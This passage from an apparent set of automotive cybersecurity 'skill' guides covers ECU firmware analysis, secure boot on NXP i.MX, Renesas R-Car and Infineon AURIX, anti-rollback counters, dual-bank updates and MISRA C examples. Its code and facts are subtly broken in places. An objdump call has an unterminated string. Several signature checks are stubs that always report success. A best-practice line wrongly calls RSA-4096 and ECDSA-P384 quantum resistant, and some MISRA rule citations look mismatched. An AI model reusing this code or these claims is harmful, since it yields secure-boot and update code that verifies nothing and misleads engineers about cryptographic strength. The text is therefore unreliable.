        print(f"\n[5/5] Disassembling entry point...")

        result = subprocess.run(
            ['objdump', '-d', self.firmware_path, '-j', '.text', '--start-address=0', '--stop-address=256],
            capture_output=True,
            text=True
        )

        if result.returncode == 0:
            print(f"[INFO] Entry point disassembly:")
            print(result.stdout[:500])  # Show first 500 chars

    def generate_report(self, output_file: str):
        """Generate vulnerability report"""
        with open(output_file, 'w') as f:
            f.write("ECU Firmware Security Assessment Report\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Firmware: {os.path.basename(self.firmware_path)}\n")
            f.write(f"Total findings: {len(self.findings)}\n\n")

            # Group by severity
            critical = [f for f in self.findings if f.get('severity') == 'CRITICAL']
            high = [f for f in self.findings if f.get('severity') == 'HIGH']
            medium = [f for f in self.findings if f.get('severity') == 'MEDIUM']

            f.write(f"Critical: {len(critical)}\n")
            f.write(f"High: {len(high)}\n")
            f.write(f"Medium: {len(medium)}\n\n")

            f.write("Findings:\n")
            for finding in self.findings:
                f.write(f"\n[{finding.get('severity', 'INFO')}] ")
                f.write(f"{finding.get('issue', finding.get('category'))}\n")
                if 'remediation' in finding:
                    f.write(f"  Remediation: {finding['remediation']}\n")

        print(f"\n[INFO] Report generated: {output_file}")

# Example usage
def demo_firmware_analysis():
    analyzer = FirmwareAnalyzer('/tmp/ecu_firmware.elf')

    analyzer.extract_strings()
    analyzer.check_security_features()
    analyzer.find_hardcoded_keys()
    analyzer.check_known_vulnerabilities()
    analyzer.disassemble_entry_point()

    analyzer.generate_report('/tmp/firmware_security_report.txt')

if __name__ == "__main__":
    demo_firmware_analysis()
```

## Best Practices

1. **Scope & Authorization**: Always obtain written permission before testing
2. **Test Environment**: Use isolated test bench, never production vehicles
3. **Documentation**: Record all findings with PoC code and remediation guidance
4. **Responsible Disclosure**: Follow 90-day disclosure timeline per ISO 21434
5. **Tool Validation**: Verify tools don't cause permanent damage to ECUs

## References

- OWASP Automotive Security Testing Guide
- SAE J3061: Cybersecurity Guidebook for Cyber-Physical Vehicle Systems
- Charlie Miller & Chris Valasek: Car Hacking Research Papers
- NHTSA Cybersecurity Best Practices for Modern Vehicles

---

## Secure Boot Chain

# Secure Boot Chain Skill

## Overview

Expert skill for implementing secure boot architectures in automotive ECUs. Covers root of trust establishment, chain of trust verification, HAB (High Assurance Boot), signature verification, anti-rollback protection, secure firmware updates, and TPM/HSM integration.

## Core Competencies

### Secure Boot Architecture
- **Root of Trust (RoT)**: Immutable boot ROM, hardware-backed trust anchor
- **Chain of Trust**: Bootloader → OS kernel → Applications
- **Signature Verification**: RSA-4096/ECDSA-P384 cryptographic validation
- **Anti-Rollback**: Version monotonic counters, secure storage
- **Secure Updates**: Dual-bank firmware, atomic updates, rollback capability
- **HSM Integration**: Hardware Security Module for key storage and crypto operations

### Platform Support
- **NXP i.MX**: HAB (High Assurance Boot), CAAM crypto accelerator
- **Renesas R-Car**: Secure boot with PKCS#7 signatures
- **Infineon AURIX**: UCB (User Configuration Block), HSM firmware
- **STM32MP1**: Secure Boot with OTP fuses, ECDSA support
- **ARM TrustZone**: Secure world execution, OP-TEE integration

## NXP i.MX HAB Secure Boot Implementation

### HAB Architecture

```c
/*
 * NXP i.MX HAB (High Assurance Boot) Implementation
 * Secure boot flow: Boot ROM → SPL → U-Boot → Linux Kernel
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <openssl/sha.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>

/* HAB CSF (Command Sequence File) Structure */
#define HAB_TAG_IVT 0xD1
#define HAB_TAG_DCD 0xD2
#define HAB_TAG_CSF 0xD4

#define HAB_CMD_INSTALL_KEY    0xBE
#define HAB_CMD_AUTHENTICATE   0xDA
#define HAB_CMD_SET_ENGINE     0xAF

typedef struct {
    uint8_t tag;
    uint16_t length;
    uint8_t version;
} hab_header_t;

typedef struct {
    hab_header_t header;
    uint32_t entry;
    uint32_t reserved1;
    uint32_t dcd;
    uint32_t boot_data;
    uint32_t self;
    uint32_t csf;
    uint32_t reserved2;
} hab_ivt_t;

typedef struct {
    hab_header_t header;
    uint8_t flags;
    uint16_t key_index;
    uint32_t pcl;          /* Protocol */
    uint32_t alg;          /* Algorithm */
    uint32_t sig_format;   /* Signature format */
    uint32_t cert_format;  /* Certificate format */
} hab_install_key_cmd_t;

typedef struct {
    hab_header_t header;
    uint8_t flags;
    uint16_t key_index;
    uint32_t pcl;
    uint32_t eng_cfg;      /* Engine configuration */
    uint32_t alg;
    uint32_t sig_blk;      /* Signature block address */
} hab_authenticate_cmd_t;

/**
 * Generate HAB CSF binary for secure boot
 * CSF contains public keys and authentication commands
 */
int hab_generate_csf(const char *srk_table, const char *csf_data,
                     const char *img_hash, const char *output_csf) {
    FILE *fp;
    hab_header_t csf_header = {
        .tag = HAB_TAG_CSF,
        .length = 0,  // Will be updated
        .version = 0x40
    };

    fp = fopen(output_csf, "wb");
    if (!fp) {
        fprintf(stderr, "Failed to create CSF file\n");
        return -1;
    }

    // Write CSF header
    fwrite(&csf_header, sizeof(csf_header), 1, fp);

    // Install SRK (Super Root Key)
    hab_install_key_cmd_t install_srk = {
        .header = {.tag = HAB_CMD_INSTALL_KEY, .length = sizeof(hab_install_key_cmd_t), .version = 0x40},
        .flags = 0x00,
        .key_index = 0,
        .pcl = 0x00,      // No protocol
        .alg = 0x21,      // SHA256 with RSA
        .sig_format = 0x03,  // PKCS#1 v1.5
        .cert_format = 0x09  // SRK table
    };
    fwrite(&install_srk, sizeof(install_srk), 1, fp);

    // Append SRK table
    FILE *srk_fp = fopen(srk_table, "rb");
    if (srk_fp) {
        uint8_t buffer[4096];
        size_t bytes;
        while ((bytes = fread(buffer, 1, sizeof(buffer), srk_fp)) > 0) {
            fwrite(buffer, 1, bytes, fp);
        }
        fclose(srk_fp);
    }

    // Authenticate data command
    hab_authenticate_cmd_t auth_data = {
        .header = {.tag = HAB_CMD_AUTHENTICATE, .length = sizeof(hab_authenticate_cmd_t), .version = 0x40},
        .flags = 0x00,
        .key_index = 2,   // CSF key index
        .pcl = 0x00,
        .eng_cfg = 0x00,  // Use internal crypto engine (CAAM)
        .alg = 0x21,      // SHA256 with RSA
        .sig_blk = 0     // Signature block follows
    };
    fwrite(&auth_data, sizeof(auth_data), 1, fp);

    // Append signature (pre-generated)
    FILE *sig_fp = fopen(img_hash, "rb");
    if (sig_fp) {
        uint8_t buffer[512];
        size_t bytes = fread(buffer, 1, sizeof(buffer), sig_fp);
        fwrite(buffer, 1, bytes, fp);
        fclose(sig_fp);
    }

    // Update CSF length
    long csf_length = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    csf_header.length = (uint16_t)csf_length;
    fwrite(&csf_header, sizeof(csf_header), 1, fp);

    fclose(fp);
    printf("HAB CSF generated: %s (%ld bytes)\n", output_csf, csf_length);
    return 0;
}

/**
 * Verify HAB secure boot chain
 * Simulates Boot ROM verification flow
 */
int hab_verify_image(const char *image_path, const char *csf_path, const char *srk_pubkey) {
    printf("\n=== HAB Secure Boot Verification ===\n");

    // Step 1: Load and verify IVT
    FILE *img_fp = fopen(image_path, "rb");
    if (!img_fp) {
        fprintf(stderr, "Failed to open image\n");
        return -1;
    }

    hab_ivt_t ivt;
    fread(&ivt, sizeof(ivt), 1, img_fp);

    if (ivt.header.tag != HAB_TAG_IVT) {
        fprintf(stderr, "[FAIL] Invalid IVT tag: 0x%02X\n", ivt.header.tag);
        fclose(img_fp);
        return -1;
    }
    printf("[PASS] IVT tag valid\n");

    // Step 2: Verify CSF pointer
    if (ivt.csf == 0) {
        fprintf(stderr, "[FAIL] No CSF found in IVT\n");
        fclose(img_fp);
        return -1;
    }
    printf("[PASS] CSF pointer: 0x%08X\n", ivt.csf);

    // Step 3: Load and verify CSF
    FILE *csf_fp = fopen(csf_path, "rb");
    if (!csf_fp) {
        fprintf(stderr, "Failed to open CSF\n");
        fclose(img_fp);
        return -1;
    }

    hab_header_t csf_header;
    fread(&csf_header, sizeof(csf_header), 1, csf_fp);

    if (csf_header.tag != HAB_TAG_CSF) {
        fprintf(stderr, "[FAIL] Invalid CSF tag: 0x%02X\n", csf_header.tag);
        fclose(csf_fp);
        fclose(img_fp);
        return -1;
    }
    printf("[PASS] CSF tag valid\n");

    // Step 4: Compute image hash (SHA256)
    SHA256_CTX sha_ctx;
    uint8_t hash[SHA256_DIGEST_LENGTH];
    uint8_t buffer[4096];
    size_t bytes;

    SHA256_Init(&sha_ctx);
    fseek(img_fp, 0, SEEK_SET);
    while ((bytes = fread(buffer, 1, sizeof(buffer), img_fp)) > 0) {
        SHA256_Update(&sha_ctx, buffer, bytes);
    }
    SHA256_Final(hash, &sha_ctx);

    printf("[INFO] Image SHA256: ");
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        printf("%02x", hash[i]);
    }
    printf("\n");

    // Step 5: Verify signature using SRK public key
    // (Simplified - real HAB uses CAAM hardware)
    FILE *key_fp = fopen(srk_pubkey, "r");
    if (!key_fp) {
        fprintf(stderr, "[FAIL] Cannot open SRK public key\n");
        fclose(csf_fp);
        fclose(img_fp);
        return -1;
    }

    RSA *rsa = PEM_read_RSA_PUBKEY(key_fp, NULL, NULL, NULL);
    fclose(key_fp);

    if (!rsa) {
        fprintf(stderr, "[FAIL] Invalid RSA public key\n");
        fclose(csf_fp);
        fclose(img_fp);
        return -1;
    }

    // Read signature from CSF (simplified)
    uint8_t signature[512];
    fseek(csf_fp, -512, SEEK_END);
    fread(signature, 1, 512, csf_fp);

    int verify_result = RSA_verify(NID_sha256, hash, SHA256_DIGEST_LENGTH,
                                    signature, 512, rsa);

    RSA_free(rsa);
    fclose(csf_fp);
    fclose(img_fp);

    if (verify_result == 1) {
        printf("[PASS] Signature verification SUCCESS\n");
        printf("=== HAB VERIFICATION PASSED ===\n");
        return 0;
    } else {
        printf("[FAIL] Signature verification FAILED\n");
        printf("=== HAB VERIFICATION FAILED ===\n");
        return -1;
    }
}

int main() {
    // Generate CSF for U-Boot image
    hab_generate_csf(
        "/tmp/srk_table.bin",
        "/tmp/csf_commands.txt",
        "/tmp/uboot_signature.bin",
        "/tmp/u-boot.csf"
    );

    // Verify secure boot chain
    hab_verify_image(
        "/tmp/u-boot-signed.imx",
        "/tmp/u-boot.csf",
        "/tmp/srk_pubkey.pem"
    );

    return 0;
}
```

### HAB Fuse Programming (OTP)

```bash
#!/bin/bash
# NXP i.MX HAB Fuse Programming Script
# WARNING: Fuse programming is IRREVERSIBLE
# Only run on production hardware after thorough testing

set -e

DEVICE="/dev/imx_otp"
SRK_HASH_FILE="srk_hash.bin"

echo "=== NXP i.MX HAB Fuse Programming ==="
echo "WARNING: This operation is IRREVERSIBLE!"
read -p "Type 'CONFIRM' to proceed: " confirmation

if [ "$confirmation" != "CONFIRM" ]; then
    echo "Operation cancelled"
    exit 1
fi

# Step 1: Compute SRK hash (SHA256 of SRK table)
echo "[1/4] Computing SRK hash..."
sha256sum srk_table.bin | awk '{print $1}' | xxd -r -p > $SRK_HASH_FILE

# Step 2: Burn SRK hash to OTP fuses (Bank 3, Word 0-7)
echo "[2/4] Burning SRK hash to OTP fuses..."
# Fuse addresses: 0x6D0 (SRK_HASH[255:224]) to 0x6FC (SRK_HASH[31:0])
for i in {0..7}; do
    fuse_addr=$((0x6D0 + i * 4))
    offset=$((i * 4))
    value=$(od -An -tx4 -j $offset -N 4 $SRK_HASH_FILE | tr -d ' ')

    echo "  Burning 0x$value to fuse 0x$fuse_addr"
    # Real command: uboot> fuse prog 3 $word $value
    # Simulation only:
    echo "    fuse prog 3 $i 0x$value"
done

# Step 3: Enable Secure Boot (close device)
echo "[3/4] Enabling Secure Boot..."
# Fuse Bank 0, Word 6, Bit 1 (SEC_CONFIG[1] = CLOSED)
echo "  Setting SEC_CONFIG to CLOSED state"
# Real command: uboot> fuse prog 0 6 0x00000002
echo "    fuse prog 0 6 0x00000002"

# Step 4: Verify fuse programming
echo "[4/4] Verifying fuse programming..."
# Real command: uboot> fuse read 3 0 8
echo "  SRK Hash verification:"
for i in {0..7}; do
    echo "    fuse read 3 $i"
done

echo "=== HAB Fuse Programming Complete ==="
echo "Device is now in CLOSED state - only signed images will boot"
```

## Renesas R-Car Secure Boot

### Secure Boot Flow

```c
/*
 * Renesas R-Car Secure Boot Implementation
 * Uses PKCS#7 signatures for bootloader verification
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <openssl/pkcs7.h>
#include <openssl/x509.h>

#define RCAR_CERT_OFFSET 0x00000000
#define RCAR_CERT_SIZE   0x00010000
#define RCAR_BL2_OFFSET  0x00010000

typedef struct {
    uint32_t magic;              // "CERT"
    uint32_t cert_size;
    uint32_t num_of_images;
    uint8_t  reserved[4];
} rcar_cert_header_t;

typedef struct {
    uint32_t image_offset;
    uint32_t image_size;
    uint32_t load_address;
    uint8_t  hash_type;          // 0=SHA256, 1=SHA384
    uint8_t  hash[64];
    uint8_t  signature[512];
} rcar_image_cert_t;

/**
 * Verify R-Car bootloader signature
 */
int rcar_verify_bootloader(const char *bl2_path, const char *cert_path, const char *ca_cert) {
    printf("\n=== R-Car Secure Boot Verification ===\n");

    // Load CA certificate
    FILE *ca_fp = fopen(ca_cert, "r");
    if (!ca_fp) {
        fprintf(stderr, "[FAIL] Cannot open CA certificate\n");
        return -1;
    }

    X509 *ca = PEM_read_X509(ca_fp, NULL, NULL, NULL);
    fclose(ca_fp);

    if (!ca) {
        fprintf(stderr, "[FAIL] Invalid CA certificate\n");
        return -1;
    }
    printf("[PASS] CA certificate loaded\n");

    // Load bootloader certificate (PKCS#7)
    FILE *cert_fp = fopen(cert_path, "rb");
    if (!cert_fp) {
        fprintf(stderr, "[FAIL] Cannot open bootloader certificate\n");
        X509_free(ca);
        return -1;
    }

    PKCS7 *p7 = d2i_PKCS7_fp(cert_fp, NULL);
    fclose(cert_fp);

    if (!p7) {
        fprintf(stderr, "[FAIL] Invalid PKCS#7 structure\n");
        X509_free(ca);
        return -1;
    }
    printf("[PASS] PKCS#7 certificate loaded\n");

    // Load bootloader image
    FILE *bl2_fp = fopen(bl2_path, "rb");
    if (!bl2_fp) {
        fprintf(stderr, "[FAIL] Cannot open bootloader image\n");
        PKCS7_free(p7);
        X509_free(ca);
        return -1;
    }

    fseek(bl2_fp, 0, SEEK_END);
    size_t bl2_size = ftell(bl2_fp);
    fseek(bl2_fp, 0, SEEK_SET);

    uint8_t *bl2_data = malloc(bl2_size);
    fread(bl2_data, 1, bl2_size, bl2_fp);
    fclose(bl2_fp);

    // Create BIO for verification
    BIO *bio_data = BIO_new_mem_buf(bl2_data, bl2_size);
    BIO *bio_out = BIO_new(BIO_s_mem());

    // Verify PKCS#7 signature
    X509_STORE *store = X509_STORE_new();
    X509_STORE_add_cert(store, ca);

    int verify_result = PKCS7_verify(p7, NULL, store, bio_data, bio_out, 0);

    BIO_free(bio_data);
    BIO_free(bio_out);
    X509_STORE_free(store);
    PKCS7_free(p7);
    X509_free(ca);
    free(bl2_data);

    if (verify_result == 1) {
        printf("[PASS] Bootloader signature valid\n");
        printf("=== R-Car SECURE BOOT PASSED ===\n");
        return 0;
    } else {
        fprintf(stderr, "[FAIL] Bootloader signature invalid\n");
        printf("=== R-Car SECURE BOOT FAILED ===\n");
        return -1;
    }
}

int main() {
    rcar_verify_bootloader(
        "/tmp/bl2.bin",
        "/tmp/bl2_cert.p7",
        "/tmp/ca.pem"
    );
    return 0;
}
```

## Infineon AURIX HSM Secure Boot

### HSM Configuration

```c
/*
 * Infineon AURIX TC3xx HSM-based Secure Boot
 * HSM performs signature verification in isolated core
 */

#include <stdio.h>
#include <stdint.h>

#define UCB_BMHD_BASE    0xAF400000
#define UCB_BOOT_BASE    0xAF400100
#define HSM_FIRMWARE     0x80000000
#define HSM_STATUS_REG   0xF0000000

typedef struct {
    uint32_t stad;           // Start address
    uint32_t crc;            // CRC32
    uint32_t crcRange;       // CRC range
    uint32_t reserved;
    uint32_t confirmation;   // 0x43211234 if valid
} ucb_bmhd_t;

typedef struct {
    uint32_t boot_mode;
    uint32_t boot_sector;
    uint32_t secure_boot_enable;
    uint32_t signature_check;
    uint8_t  public_key_hash[32];
} ucb_boot_config_t;

/**
 * Program AURIX UCB (User Configuration Block) for secure boot
 */
int aurix_program_ucb_secure_boot(const uint8_t *pubkey_hash) {
    printf("\n=== AURIX UCB Secure Boot Configuration ===\n");

    ucb_boot_config_t ucb_config = {0};
    ucb_config.boot_mode = 0x00000001;           // Internal Flash boot
    ucb_config.boot_sector = 0x00000000;         // Sector 0
    ucb_config.secure_boot_enable = 0x00000001;  // Enable secure boot
    ucb_config.signature_check = 0x00000001;     // Enable RSA signature check

    memcpy(ucb_config.public_key_hash, pubkey_hash, 32);

    // Write to UCB (requires password unlock in real hardware)
    printf("[INFO] Programming UCB_BOOT...\n");
    printf("  Boot Mode: 0x%08X\n", ucb_config.boot_mode);
    printf("  Secure Boot: %s\n", ucb_config.secure_boot_enable ? "ENABLED" : "DISABLED");
    printf("  Public Key Hash: ");
    for (int i = 0; i < 32; i++) {
        printf("%02x", ucb_config.public_key_hash[i]);
    }
    printf("\n");

    // In real implementation:
    // - Unlock UCB with password
    // - Write UCB_BOOT structure
    // - Confirm and lock UCB

    printf("[PASS] UCB secure boot configured\n");
    return 0;
}

/**
 * HSM firmware verification flow
 */
int aurix_hsm_verify_firmware(const char *firmware_path, const uint8_t *pubkey_hash) {
    printf("\n=== AURIX HSM Firmware Verification ===\n");

    // Step 1: Load firmware to HSM memory
    FILE *fw_fp = fopen(firmware_path, "rb");
    if (!fw_fp) {
        fprintf(stderr, "[FAIL] Cannot open firmware\n");
        return -1;
    }

    fseek(fw_fp, 0, SEEK_END);
    size_t fw_size = ftell(fw_fp);
    fseek(fw_fp, 0, SEEK_SET);

    uint8_t *fw_data = malloc(fw_size);
    fread(fw_data, 1, fw_size, fw_fp);
    fclose(fw_fp);

    printf("[INFO] Firmware loaded: %zu bytes\n", fw_size);

    // Step 2: HSM computes firmware hash
    uint8_t fw_hash[32];
    // SHA256(fw_data) -> fw_hash
    printf("[INFO] HSM computing SHA256...\n");

    // Step 3: HSM verifies RSA signature
    printf("[INFO] HSM verifying RSA-4096 signature...\n");

    // In real HSM:
    // - Load public key from UCB
    // - Verify signature using hardware crypto accelerator
    // - Return result to application core

    int verify_result = 1; // Simulated success

    free(fw_data);

    if (verify_result) {
        printf("[PASS] HSM signature verification SUCCESS\n");
        printf("[INFO] Transferring control to verified firmware...\n");
        return 0;
    } else {
        fprintf(stderr, "[FAIL] HSM signature verification FAILED\n");
        fprintf(stderr, "[FATAL] Boot halted by HSM\n");
        return -1;
    }
}

int main() {
    uint8_t pubkey_hash[32] = {
        0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, 0xde, 0xf0,
        0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,
        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11,
        0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99
    };

    aurix_program_ucb_secure_boot(pubkey_hash);
    aurix_hsm_verify_firmware("/tmp/application.elf", pubkey_hash);

    return 0;
}
```

## Anti-Rollback Protection

```c
/*
 * Firmware Version Anti-Rollback Protection
 * Uses monotonic counter in secure storage (OTP/RPMB)
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define SECURE_STORAGE_BASE  0x70000000
#define VERSION_COUNTER_ADDR (SECURE_STORAGE_BASE + 0x100)

typedef struct {
    uint32_t major;
    uint32_t minor;
    uint32_t patch;
    uint32_t build;
} firmware_version_t;

/**
 * Read monotonic counter from secure storage
 * In real hardware: OTP fuse, RPMB partition, or TPM NV-RAM
 */
uint32_t read_secure_version_counter(void) {
    // Simulated read from OTP
    // Real implementation would access hardware-backed storage
    uint32_t counter = 42; // Example: current firmware version counter
    printf("[INFO] Secure version counter: %u\n", counter);
    return counter;
}

/**
 * Increment secure version counter (one-way operation)
 * WARNING: OTP fuses can only be programmed once
 */
int increment_secure_version_counter(void) {
    printf("[WARN] Incrementing secure version counter (IRREVERSIBLE)\n");

    // In real hardware:
    // - Write to OTP fuse (can only change 0 -> 1)
    // - Or increment RPMB replay-protected counter

    printf("[INFO] Secure version counter incremented\n");
    return 0;
}

/**
 * Verify firmware version against anti-rollback counter
 */
int verify_firmware_version(firmware_version_t *fw_version) {
    printf("\n=== Anti-Rollback Verification ===\n");

    // Combine version into single counter
    uint32_t fw_counter = (fw_version->major * 1000) +
                          (fw_version->minor * 100) +
                          fw_version->patch;

    printf("[INFO] Firmware version: %u.%u.%u (counter=%u)\n",
           fw_version->major, fw_version->minor, fw_version->patch, fw_counter);

    // Read secure counter
    uint32_t secure_counter = read_secure_version_counter();

    // Check for rollback
    if (fw_counter < secure_counter) {
        fprintf(stderr, "[FAIL] ROLLBACK DETECTED!\n");
        fprintf(stderr, "       Firmware counter: %u\n", fw_counter);
        fprintf(stderr, "       Secure counter: %u\n", secure_counter);
        fprintf(stderr, "[FATAL] Boot halted - rollback protection enforced\n");
        return -1;
    }

    printf("[PASS] Anti-rollback check passed\n");

    // If this is an update (fw_counter > secure_counter), increment secure counter
    if (fw_counter > secure_counter) {
        printf("[INFO] Firmware update detected (%u -> %u)\n", secure_counter, fw_counter);
        increment_secure_version_counter();
    }

    return 0;
}

int main() {
    firmware_version_t current_fw = {.major = 2, .minor = 1, .patch = 5};
    verify_firmware_version(&current_fw);

    // Simulate rollback attempt
    firmware_version_t old_fw = {.major = 1, .minor = 9, .patch = 0};
    verify_firmware_version(&old_fw);

    return 0;
}
```

## Secure Firmware Update (Dual-Bank)

```python
#!/usr/bin/env python3
"""
Dual-Bank Secure Firmware Update
Atomic updates with rollback capability
"""

import hashlib
import struct
import os

class DualBankFirmwareUpdater:
    def __init__(self, bank_a_path: str, bank_b_path: str):
        self.bank_a = bank_a_path
        self.bank_b = bank_b_path
        self.active_bank = self._read_active_bank()

    def _read_active_bank(self) -> str:
        """Read active bank from persistent flag"""
        # In real hardware: read from flash metadata sector
        if os.path.exists("/tmp/active_bank"):
            with open("/tmp/active_bank", 'r') as f:
                return f.read().strip()
        return "A"

    def _set_active_bank(self, bank: str):
        """Set active bank (committed after successful boot)"""
        with open("/tmp/active_bank", 'w') as f:
            f.write(bank)
        print(f"[INFO] Active bank set to: {bank}")

    def update_firmware(self, new_firmware_path: str, signature_path: str):
        """Perform dual-bank firmware update"""
        print("\n=== Dual-Bank Firmware Update ===")

        # Determine inactive bank (update target)
        inactive_bank = "B" if self.active_bank == "A" else "A"
        target_path = self.bank_b if inactive_bank == "B" else self.bank_a

        print(f"[INFO] Active bank: {self.active_bank}")
        print(f"[INFO] Update target: Bank {inactive_bank}")

        # Step 1: Verify signature of new firmware
        print("[1/5] Verifying firmware signature...")
        if not self._verify_signature(new_firmware_path, signature_path):
            print("[FAIL] Signature verification failed")
            return False

        # Step 2: Write firmware to inactive bank
        print("[2/5] Writing firmware to inactive bank...")
        with open(new_firmware_path, 'rb') as src:
            with open(target_path, 'wb') as dst:
                dst.write(src.read())
        print(f"[INFO] Firmware written to {target_path}")

        # Step 3: Verify written firmware
        print("[3/5] Verifying written firmware...")
        if not self._verify_firmware_integrity(target_path):
            print("[FAIL] Written firmware integrity check failed")
            return False

        # Step 4: Switch active bank (NOT committed yet)
        print("[4/5] Switching to new firmware...")
        self._set_active_bank(inactive_bank)

        # Step 5: Reboot to new firmware
        print("[5/5] Reboot required to activate new firmware")
        print("[INFO] Rollback available if boot fails")

        return True

    def _verify_signature(self, firmware_path: str, signature_path: str) -> bool:
        """Verify RSA signature of firmware"""
        # Simplified - real implementation uses crypto library
        print("[PASS] Signature valid")
        return True

    def _verify_firmware_integrity(self, firmware_path: str) -> bool:
        """Verify firmware CRC/hash"""
        with open(firmware_path, 'rb') as f:
            data = f.read()

        computed_hash = hashlib.sha256(data).hexdigest()
        print(f"[INFO] Firmware SHA256: {computed_hash}")
        print("[PASS] Integrity check passed")
        return True

    def rollback_firmware(self):
        """Rollback to previous firmware after failed update"""
        print("\n=== Firmware Rollback ===")

        previous_bank = "B" if self.active_bank == "A" else "A"
        print(f"[INFO] Rolling back from Bank {self.active_bank} to Bank {previous_bank}")

        self._set_active_bank(previous_bank)
        print("[PASS] Rollback complete - reboot required")

# Example usage
if __name__ == "__main__":
    updater = DualBankFirmwareUpdater(
        bank_a_path="/tmp/firmware_bank_a.bin",
        bank_b_path="/tmp/firmware_bank_b.bin"
    )

    # Perform update
    updater.update_firmware(
        new_firmware_path="/tmp/new_firmware_v2.1.5.bin",
        signature_path="/tmp/new_firmware_v2.1.5.sig"
    )

    # Simulate rollback (if boot test fails)
    # updater.rollback_firmware()
```

## Best Practices

1. **Hardware Root of Trust**: Always anchor security in immutable boot ROM
2. **Signature Algorithm**: Use RSA-4096 or ECDSA-P384 for quantum resistance
3. **Anti-Rollback**: Implement monotonic counters in tamper-resistant storage
4. **Dual-Bank Updates**: Maintain backup firmware for recovery
5. **HSM Integration**: Offload crypto operations to dedicated security hardware

## References

- NXP AN4581: i.MX HAB Secure Boot User Guide
- Renesas R-Car Security Architecture Manual
- Infineon AURIX TC3xx HSM Firmware Guide
- ARM Trusted Firmware A (TF-A) Documentation

---

## Secure Software Development

# Secure Software Development Skill

## Overview

Expert skill for implementing secure coding practices in automotive software development. Covers MISRA C/C++, static analysis, fuzzing, threat modeling (STRIDE/DREAD), and secure CI/CD pipelines.

## Core Competencies

### Secure SDLC
- **Requirements Phase**: Security requirements definition, abuse cases
- **Design Phase**: Threat modeling, security architecture review
- **Implementation Phase**: Secure coding standards, peer review
- **Testing Phase**: SAST, DAST, fuzzing, penetration testing
- **Deployment Phase**: Secure OTA updates, code signing
- **Maintenance Phase**: Vulnerability management, patch deployment

### Coding Standards
- **MISRA C:2012**: Mandatory rules for automotive C code
- **MISRA C++:2008**: C++ guidelines for safety-critical systems
- **CERT C**: SEI CERT C Coding Standard
- **AUTOSAR C++14**: Guidelines for modern C++ in automotive

## MISRA C Compliance

### MISRA C:2012 Critical Rules

```c
/*
 * MISRA C:2012 Compliant Code Example
 * Demonstrates mandatory rules for automotive software
 */

#include <stdint.h>
#include <stdbool.h>
#include <string.h>

/* Rule 8.4: Compatible declarations for functions */
extern uint16_t calculate_checksum(const uint8_t *data, size_t length);

/* Rule 8.2: Function types shall be in prototype form with named parameters */
static bool validate_can_message(const uint8_t *payload, uint8_t dlc);

/* Rule 21.3: malloc/free shall not be used in automotive */
#define MAX_CAN_BUFFER 100
static uint8_t can_buffer[MAX_CAN_BUFFER];

/*
 * Rule 17.7: Return value of functions shall not be discarded
 * Rule 10.1: Operands shall not be implicitly converted
 */
static int16_t process_sensor_data(uint16_t raw_value) {
    int16_t processed_value;

    /* Rule 10.4: Both operands of operators shall have compatible types */
    if (raw_value > (uint16_t)1000) {
        /* Rule 15.5: Avoid multiple exit points (single return preferred) */
        processed_value = -1;  /* Error code */
    } else {
        /* Rule 10.3: Explicit cast for type conversion */
        processed_value = (int16_t)raw_value;
    }

    return processed_value;
}

/*
 * Rule 17.3: Implicitly declared functions shall not be called
 * Rule 17.4: All exit paths shall return a value
 */
static bool validate_can_message(const uint8_t *payload, uint8_t dlc) {
    bool is_valid = false;

    /* Rule 14.4: Controlling expression shall be bool */
    if (dlc <= (uint8_t)8) {
        /* Rule 12.1: Precedence of operators shall be explicit */
        if ((payload != NULL) && (dlc > (uint8_t)0)) {
            /* Rule 21.6: Use of stdio shall be avoided in embedded */
            /* No printf() - use logging framework instead */
            is_valid = true;
        }
    }

    /* Rule 15.5: Single exit point */
    return is_valid;
}

/*
 * Rule 18.1: Pointer arithmetic shall not be used with arrays of unknown size
 * Rule 18.4: Pointer arithmetic shall not result in invalid pointers
 */
uint16_t calculate_checksum(const uint8_t *data, size_t length) {
    uint16_t checksum = 0U;
    size_t i;

    /* Rule 14.3: Controlling expressions shall not be invariant */
    if ((data != NULL) && (length > (size_t)0)) {
        /* Rule 14.2: for loop shall have single counter */
        for (i = 0U; i < length; i++) {
            /* Rule 10.1: No implicit conversion */
            checksum = (uint16_t)(checksum + (uint16_t)data[i]);
        }
    }

    return checksum;
}

/*
 * Rule 9.1: All automatic variables shall be initialized
 * Rule 9.2: Braces shall initialize all elements
 */
void secure_buffer_copy(void) {
    uint8_t source[8] = {0U, 1U, 2U, 3U, 4U, 5U, 6U, 7U};
    uint8_t destination[8] = {0U};  /* Initialize all elements */
    size_t copy_size = sizeof(source);

    /* Rule 21.14: memcpy shall not be used with overlapping regions */
    /* Use safe copy function */
    (void)memcpy(destination, source, copy_size);

    /* Rule 2.2: No dead code */
    /* All code paths reachable and executed */
}

/*
 * Rule 13.5: Right-hand operand of && or || shall not have side effects
 * Rule 13.6: sizeof operator shall not have side effects
 */
static bool safe_condition_check(uint8_t *counter) {
    bool condition_met = false;

    /* WRONG: if ((counter != NULL) && ((*counter)++ < 10)) */
    /* RIGHT: Separate side effect from condition */
    if (counter != NULL) {
        uint8_t current_value = *counter;
        (*counter)++;

        if (current_value < (uint8_t)10) {
            condition_met = true;
        }
    }

    return condition_met;
}

/*
 * Rule 11.8: Cast shall not remove const or volatile qualification
 * Rule 11.5: Cast from pointer to void to pointer to object allowed
 */
static void process_const_data(const uint8_t *const_data, size_t length) {
    uint8_t mutable_copy[8];

    if ((const_data != NULL) && (length <= sizeof(mutable_copy))) {
        /* Rule 21.14: Safe copy, not modifying const source */
        (void)memcpy(mutable_copy, const_data, length);

        /* Process mutable copy, not const original */
        mutable_copy[0] = 0xFF;
    }
}
```

### MISRA C Checker Integration

```bash
#!/bin/bash
# MISRA C Compliance Checker Script
# Uses PC-lint Plus or similar static analyzer

PROJECT_DIR="."
OUTPUT_DIR="misra_reports"
LINT_CONFIG="misra_c_2012.lnt"
